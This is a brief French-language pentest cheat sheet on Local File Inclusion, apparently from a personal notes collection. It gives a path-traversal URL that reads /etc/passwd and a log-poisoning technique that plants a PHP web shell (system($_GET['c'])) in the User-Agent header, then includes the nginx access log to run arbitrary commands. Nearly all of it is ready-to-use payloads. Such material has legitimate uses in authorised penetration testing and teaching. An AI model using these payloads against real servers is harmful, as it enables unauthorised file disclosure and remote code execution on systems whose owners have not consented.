# Local File Inclusion

### Basique

```
https://domain.com?page=<PATH-TO-FILE> # exemple : ../../../etc/passwd
```

### LFI to RCE

#### PHP

S'il est possible de lire les journaux d'évènements du serveur (du à un mauvais filtrage sur la fonction `include`) et qu'il est possible d'utiliser n'importe quel `User-Agent`, alors il est possible d'exécuter des commandes sur le serveur.

```
# Modifier le User-Agent et faire une requête sur n'importe quelle page qui existe (cette valeur sera stockée dans les logs)
User-Agent: <?php system($_GET['c']); ?>
# Réaliser la LFI + exécuter une commande
https://domain.com?page=../../var/log/nginx/access.log&c=<CMD>
```
